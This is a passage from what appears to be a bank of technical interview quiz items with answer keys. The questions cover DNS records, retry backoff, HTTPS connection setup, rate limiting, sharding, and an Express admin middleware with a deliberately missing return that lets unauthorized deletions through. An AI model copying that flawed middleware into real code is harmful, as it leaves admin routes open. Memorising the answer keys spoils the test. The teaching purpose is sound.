    question: "In DNS, what is the difference between an A record, a CNAME record, and an MX record?",
    code: null,
    options: {
      a: "They are three names for the same thing",
      b: "An A record maps a hostname to an IPv4 address; a CNAME aliases one hostname to another hostname; an MX record specifies the mail server(s) that accept email for the domain",
      c: "A records are for email, MX records are for websites, CNAME records are for security",
      d: "Only A records are real; CNAME and MX are deprecated"
    },
    answer: "b",
    solution: "Correct: b. DNS holds several record *types*, each answering a different question about a domain:\n- **A record** — hostname → **IPv4 address** (`example.com → 93.184.216.34`). The fundamental 'where does this name point' record. **AAAA** is the IPv6 equivalent.\n- **CNAME** (Canonical Name) — hostname → **another hostname** (`www.example.com → example.com`, or `app.example.com → myapp.herokudns.com`). An alias: the resolver then looks up the target's A record. Used to point subdomains at a service whose IP you don't control (CDNs, PaaS) so the provider can change IPs without you updating anything. Key rule: a CNAME can't coexist with other records on the same name, so the root/apex domain (`example.com`) traditionally can't be a CNAME (hence provider 'ALIAS/ANAME' workarounds).\n- **MX record** (Mail Exchange) — names the **mail servers** that receive email for the domain, each with a priority number (lower = preferred). This is why your website and your email can live on entirely different servers — `example.com`'s A record points at the web host while its MX points at Google/Microsoft mail.\n\nWhy the others are wrong: a — they serve distinct purposes; c — scrambles the mapping (A is web/general, MX is email); d — all three are core, current record types.\n\nRounding out the set worth naming: **TXT** (arbitrary text — used for domain verification and email-security records like SPF/DKIM), **NS** (which name servers are authoritative for the domain), and the **TTL** on every record (how long resolvers may cache it — the reason DNS changes 'propagate' slowly)."
  },
  {
    id: "intw-046",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "This retry logic hammers a struggling downstream service and sometimes makes outages worse. What two improvements would you make, and why?",
    code: "async function callService(url) {\n  for (let i = 0; i < 5; i++) {\n    try {\n      return await fetch(url).then((r) => r.json());\n    } catch (e) {\n      // immediately try again\n    }\n  }\n  throw new Error(\"failed after 5 attempts\");\n}",
    options: null,
    answer: null,
    solution: "Two problems make this loop actively harmful:\n\n**1. No backoff — it retries instantly.** When the downstream service is struggling (overloaded, mid-restart), five immediate retries from *every* client pile *more* load onto it at the worst moment — a self-inflicted denial of service that turns a brief blip into a sustained outage (the 'retry storm'). The fix is **exponential backoff with jitter**: wait progressively longer between attempts, with randomness so thousands of clients don't retry in synchronized waves:\n\nconst base = 200;\nconst delay = base * 2 ** i + Math.random() * 100;  // exponential + jitter\nawait new Promise((r) => setTimeout(r, delay));\n\nBackoff gives the service room to recover; jitter spreads retries out instead of stampeding.\n\n**2. It retries everything, including non-retryable errors.** A `400` or `404` will *never* succeed on retry — retrying wastes time and load on a permanent failure. (Note the `fetch` gotcha: fetch only rejects on network errors, so a `500` doesn't even hit the catch here — you'd need to check `r.ok`.) Retry only **transient** failures: network errors, timeouts, `429`, and `5xx`. Bail immediately on `4xx` (except 429).\n\nThe production-grade version adds — and you should *name* — two more patterns: a **timeout** per attempt (via `AbortController`) so a hung request doesn't eat the whole budget, and a **circuit breaker** — after a threshold of failures, stop calling the service for a cooldown and fail fast, so you're not throwing requests at a known-dead dependency (and you give it space to recover). Also ensure the operation is **idempotent** before retrying — retrying a non-idempotent POST risks double effects. Interview tip: 'exponential backoff with jitter, retry only transient errors, plus timeouts and a circuit breaker' is the full resilience vocabulary; 'retries without backoff make outages worse' is the insight that matters most."
  },
  {
    id: "intw-047",
    category: "interview",
    difficulty: "basic",
    type: "open",
    question: "After DNS resolution gives the browser the server's IP for https://example.com, what happens network-wise from establishing the connection to receiving the HTML?",
    code: null,
    options: null,
    answer: null,
    solution: "With the IP in hand, the browser builds the connection in layers and then does the HTTP exchange. **(1) TCP handshake** — open a TCP connection to the IP on port 443 via the three-way handshake (SYN → SYN-ACK → ACK). This establishes a reliable, ordered byte stream (TCP guarantees delivery and order, retransmitting lost packets) and costs one round trip. **(2) TLS handshake** — because it's HTTPS, browser and server negotiate encryption: agree on TLS version and cipher, the server presents its **certificate** (validated against trusted CAs, domain checked), and they derive a shared symmetric session key (TLS 1.3 in ~1 round trip; older ~2). Everything after is encrypted. **(3) HTTP request** — over the secure connection, the browser sends `GET / HTTP/...` with headers (Host, cookies, Accept, User-Agent). **(4) Server processing** — the server (often behind a reverse proxy/load balancer that terminated TLS) routes the request, maybe queries a database or cache, and renders or fetches the HTML. **(5) HTTP response** — status line (`200 OK`), headers (Content-Type, Cache-Control, Set-Cookie...), then the HTML body streams back. **(6) Parse and continue** — as HTML arrives the browser builds the DOM, discovers sub-resources (CSS, JS, images), and fetches those (reusing the connection via keep-alive, or multiplexing over HTTP/2), beginning the render pipeline. Details that show depth: TCP+TLS setup is why the *first* byte takes a couple of round trips, why **connection reuse** and **HTTP/2 multiplexing** matter, and why `preconnect` hints exist (pay the handshake early); QUIC/HTTP/3 collapses TCP+TLS into one handshake over UDP to cut that latency. Interview tip: the ladder 'TCP handshake → TLS handshake (with cert validation) → HTTP request → server work → HTTP response → parse and fetch sub-resources' is the structure expected; noting that round trips dominate first-load latency shows you understand *why* it matters."
  },
  {
    id: "intw-048",
    category: "interview",
    difficulty: "medium",
    type: "mcq",
    question: "Your API is being abused by a few clients making thousands of requests per minute, so you add rate limiting. What status code and header convention is the standard way to tell clients they're being limited?",
    code: null,
    options: {
      a: "Return 403 Forbidden with no extra headers",
      b: "Return 429 Too Many Requests, ideally with a `Retry-After` header telling the client how long to wait, and often `RateLimit-*` headers exposing the limit/remaining/reset",
      c: "Return 500 Internal Server Error so the client backs off",
      d: "Silently drop the connection with no response"
    },
    answer: "b",
    solution: "Correct: b. **429 Too Many Requests** is the purpose-built status code: it tells the client unambiguously 'you're being rate-limited' (not 'forbidden forever', not 'the server broke'). Pair it with **`Retry-After`** — seconds to wait or an HTTP date — so a well-behaved client knows *exactly* how long to back off instead of guessing or hammering. Many APIs also expose the budget proactively on *every* response via `RateLimit-Limit`, `RateLimit-Remaining`, and `RateLimit-Reset` (or the older `X-RateLimit-*` convention), letting clients self-throttle *before* hitting the wall. The whole point is making the limit *machine-readable* so good clients cooperate.\n\nWhy the others are wrong: a — **403 Forbidden** means 'not allowed at all' (an authorization decision), semantically wrong and giving no retry signal; 429 specifically conveys 'try again soon.' c — **500** lies (implies a *server* bug, pollutes error monitoring, and a client may retry *immediately* assuming a transient glitch — the opposite of backing off). d — silently dropping gives the client nothing to act on; it'll likely retry aggressively, and you lose the chance to communicate cooperatively.\n\nSurrounding concepts worth a sentence: rate limiting is typically implemented with algorithms like **token bucket** (allows bursts up to a capacity, refills steadily) or **sliding window**, keyed by API key / user / IP, and lives at the edge (API gateway, reverse proxy, or a Redis-backed counter) so it protects the whole backend; it's distinct from but complementary to a **circuit breaker** (which protects *you* from a failing *downstream*). Interview tip: '429 with Retry-After, plus RateLimit headers so clients self-regulate' is complete, and explaining why 403/500 are semantically wrong shows real fluency."
  },
  {
    id: "intw-049",
    category: "interview",
    difficulty: "advanced",
    type: "open",
    question: "What is database sharding, when do you actually need it, and what hard problems does it create? Why is it usually a last resort?",
    code: null,
    options: null,
    answer: null,
    solution: "Sharding is **horizontal partitioning of data across multiple database servers**: instead of one database holding all rows, each shard holds a *subset* — e.g. users A–M on shard 1, N–Z on shard 2, or partitioned by a hash of user_id. It's distinct from **replication** (full *copies* of the same data for read scaling and failover) — sharding splits the data to scale *writes* and total storage past what one machine can hold. When you actually need it: when a single primary database is the bottleneck on **write throughput** or **data volume** and you've exhausted the cheaper options — and the ordering matters, because sharding is a last resort *after* bigger hardware (vertical scaling — lots of runway), read replicas (read-heavy load), caching (Redis in front of hot reads), query/index optimization, and connection pooling. Most apps never shard; reaching for it early is premature complexity. The hard problems it creates: **(1) Choosing a shard key** is a near-irreversible, high-stakes decision — a bad key causes **hotspots** (one celebrity user's shard melts while others idle) or uneven distribution; changing it later means a massive migration. **(2) Cross-shard queries become expensive or impossible** — a query touching multiple shards must scatter-gather and merge in the app; `JOIN`s across shards don't exist; aggregates ('count all orders') must hit every shard. **(3) Transactions across shards** lose ACID guarantees — into distributed-transaction territory (two-phase commit, sagas), genuinely hard and a common source of consistency bugs. **(4) Operational complexity multiplies** — rebalancing when adding a shard, a routing layer that knows which shard holds what, more servers to monitor and back up. **(5) Unique constraints and auto-increment IDs** break across shards (need UUIDs or a coordinated ID generator). The strategic takeaway: sharding trades a single, simple, fully-relational database for a distributed system with all its difficulties — so the senior instinct is to *delay* it, scale the easy dimensions first, and shard only when the data genuinely outgrows one machine. (Sometimes the better answer is splitting *by feature* into separate databases, or moving one high-volume workload to a store built for horizontal scale.) Interview tip: 'shard to scale writes/storage past one machine, but only after vertical scaling, replicas, and caching — because it costs you cross-shard joins, distributed transactions, and a shard-key decision you can't undo' is the complete, senior-shaped answer."
  },
  {
    id: "intw-050",
    category: "interview",
    difficulty: "medium",
    type: "code",
    question: "This Express middleware is supposed to protect admin routes, but a security reviewer finds it doesn't actually stop unauthorized access. Spot the bug.",
    code: "function requireAdmin(req, res, next) {\n  if (!req.user.isAdmin) {\n    res.status(403).send(\"Forbidden\");\n  }\n  next();\n}\n\napp.delete(\"/admin/users/:id\", requireAdmin, (req, res) => {\n  deleteUser(req.params.id);\n  res.send(\"deleted\");\n});",
    options: null,
    answer: null,
    solution: "The bug is a **missing `return`**: after sending the 403, the code keeps executing and calls `next()` anyway — so the request proceeds to the route handler and `deleteUser` runs. The 403 response and the deletion *both* happen (and trying to send a second response throws 'headers already sent', but the damage — the deletion — is already done). A non-admin gets blocked in appearance only.\n\nThe fix — short-circuit on the rejection path:\n\nfunction requireAdmin(req, res, next) {\n  if (!req.user.isAdmin) {\n    return res.status(403).send(\"Forbidden\");  // return stops execution\n  }\n  next();  // only reached when authorized\n}\n\nThe principle: in middleware, **sending a response is not the same as ending execution** — you must `return` (or use `else`) so control doesn't fall through to `next()`. This 'send-but-forget-to-return' is one of the most common real auth bugs precisely because it *looks* right and the happy path (admins) works fine — only the rejection path is broken, and that's the path you least test manually.\n\nA second flaw worth flagging: `req.user.isAdmin` will **throw** if `req.user` is undefined (unauthenticated request) — a `TypeError` that could 500 or behave unpredictably. Guard it: `if (!req.user || !req.user.isAdmin)`, and ensure an authentication middleware runs *before* this authorization middleware (authn establishes *who you are*, authz checks *what you're allowed* — order matters). Interview framing: the headline answer is 'missing return — the response is sent but execution continues to the handler, so the action runs anyway'; noting the unauthenticated `req.user` crash and authn-before-authz ordering rounds it out."
  }
];
